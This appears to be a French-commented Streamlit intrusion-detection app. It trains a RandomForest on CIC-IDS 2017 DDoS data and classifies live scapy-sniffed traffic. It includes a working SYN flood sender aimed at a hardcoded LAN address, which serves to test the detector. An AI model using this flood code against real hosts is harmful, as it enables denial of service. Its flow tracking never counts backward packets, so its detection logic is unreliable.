import streamlit as st
from scapy.all import sniff, send
from scapy.layers.inet import IP, TCP, UDP
import pandas as pd
from sklearn.ensemble import RandomForestClassifier
import threading
import time
from collections import defaultdict
import random

# ===================== Session =====================
if 'alerts' not in st.session_state:
    st.session_state.alerts = []
if 'monitor_started' not in st.session_state:
    st.session_state.monitor_started = False


# ===================== Chargement et entraînement =====================
@st.cache_resource
def train_model_cic():
    file_path = "./Friday-WorkingHours-Afternoon-DDos.pcap_ISCX.csv"
    df = pd.read_csv(file_path)
    df.columns = df.columns.str.strip()  # Nettoyage des noms de colonnes
    print(df['Label'].unique())

    cols = [
        "Flow Duration",
        "Total Fwd Packets",
        "Total Backward Packets",
        "Total Length of Fwd Packets",
        "Total Length of Bwd Packets",
        "Label"
    ]
    df = df[cols]

    df.dropna(inplace=True)
    df.drop_duplicates(inplace=True)

    df = df[df['Label'].isin(['BENIGN', 'DoS Hulk', 'DDoS'])]
    df['Label'] = df['Label'].apply(lambda x: 'attack' if x != 'BENIGN' else 'normal')

    X = df.drop(columns=['Label'])
    Y = df['Label']

    model = RandomForestClassifier(n_estimators=100)
    model.fit(X, Y)

    return model, X.columns.tolist()


model, feature_names = train_model_cic()


# ===================== Prédiction =====================
def predict(model, features):
    try:
        df = pd.DataFrame([features], columns=feature_names)
        prediction = model.predict(df)[0]
        return prediction
    except Exception as e:
        st.session_state.alerts.append(f"⚠️ Erreur dans la prédiction : {str(e)}")
        return None


# ===================== Scapy =====================
connection_data = defaultdict(lambda: {
    "start_time": None,
    "fwd_packets": 0,
    "bwd_packets": 0,
    "fwd_bytes": 0,
    "bwd_bytes": 0,
})
alert_buffer = []


def process_packet(packet):
    try:
        if IP in packet:
            src = packet[IP].src
            dst = packet[IP].dst

            # Filtrage des adresses multicast (224.0.0.0 à 239.255.255.255)
            if dst.startswith("224.") or dst.startswith("239."):
                return

            key = (src, dst)

            if connection_data[key]["start_time"] is None:
                connection_data[key]["start_time"] = time.time()

            length = len(packet)
            if packet[IP].src == key[0]:  # Forward
                connection_data[key]["fwd_packets"] += 1
                connection_data[key]["fwd_bytes"] += length
            else:  # Backward
                connection_data[key]["bwd_packets"] += 1
                connection_data[key]["bwd_bytes"] += length

            duration = (time.time() - connection_data[key]["start_time"]) * 1_000_000  # µs

            # Ignorer les flux trop courts ou trop petits
            if duration < 1000 or (connection_data[key]["fwd_packets"] + connection_data[key]["bwd_packets"]) < 5:
                return

            features = {
                "Flow Duration": duration,
                "Total Fwd Packets": connection_data[key]["fwd_packets"],
                "Total Backward Packets": connection_data[key]["bwd_packets"],
                "Total Length of Fwd Packets": connection_data[key]["fwd_bytes"],
                "Total Length of Bwd Packets": connection_data[key]["bwd_bytes"],
            }

            prediction = predict(model, features)
            if prediction == "attack":
                alert_buffer.append(f"🚨 ATTACK DETECTED from {src} to {dst}")
    except Exception as e:
        alert_buffer.append(f"⚠️ Erreur : {str(e)}")


def start_sniffing():
    while True:
        sniff(filter="ip", prn=process_packet, store=False)


# ===================== Simuler une fausse attaque =====================

def get_real_attack_sample():
    df = pd.read_csv("./Friday-WorkingHours-Afternoon-DDos.pcap_ISCX.csv")
    df.columns = df.columns.str.strip()
    df = df[df['Label'] == 'DDoS']
    df = df[[
        "Flow Duration",
        "Total Fwd Packets",
        "Total Backward Packets",
        "Total Length of Fwd Packets",
        "Total Length of Bwd Packets"
    ]]
    df.dropna(inplace=True)
    return df.iloc[0].to_dict()


# ===================== Attaque SYN Flood =====================
def send_syn_flood(target_ip, target_port, num_packets=1000):
    for _ in range(num_packets):
        ip = IP(dst=target_ip)
        syn = TCP(dport=target_port, flags="S", seq=random.randint(1, 65535))
        packet = ip/syn
        send(packet)
    print(f"Attaque SYN Flood envoyée vers {target_ip}:{target_port}")


# ===================== Interface Streamlit =====================
st.title("🛡️ Jeanne d'Arc - Détection d'attaques réseau (CIC-IDS 2017)")

if st.button("🚀 Démarrer la surveillance") and not st.session_state.monitor_started:
    st.session_state.monitor_started = True
    threading.Thread(target=start_sniffing, daemon=True).start()
    st.success("Surveillance en cours...")

if st.button("Simuler une fausse attaque"):
    print("attaque envoyer")
    fake_attack_data = get_real_attack_sample()
    prediction = predict(model, fake_attack_data)
    if prediction == "attack":
        alert_buffer.append(f"🚨 SIMULATION ATTACK DETECTED")
    print(prediction)

    if prediction == "attack":
        st.success("✅ Simulation : L'attaque a été détectée !")
    else:
        st.error("❌ Simulation : Aucune attaque détectée.")

# Envoi d'attaque SYN Flood avec des données brutes
def send_real_syn_flood():
    # Adresse IP cible et port définis en dur
    target_ip = "192.168.1.194"
    target_port = 80
    num_packets = 1000  # Nombre de paquets envoyés
    send_syn_flood(target_ip, target_port, num_packets)

if st.button("Envoyer une attaque SYN Flood (données brutes)"):
    send_real_syn_flood()

alert_area = st.empty()

# Boucle d'affichage continue
while True:
    if alert_buffer:
        st.session_state.alerts.extend(alert_buffer)
        alert_buffer.clear()

    with alert_area.container():
        with st.expander("🔔 Dernières alertes", expanded=True):
            for alert in st.session_state.alerts[-10:][::-1]:
                if "ATTACK" in alert:
                    st.error(alert)
                else:
                    st.success(alert)

    time.sleep(1)
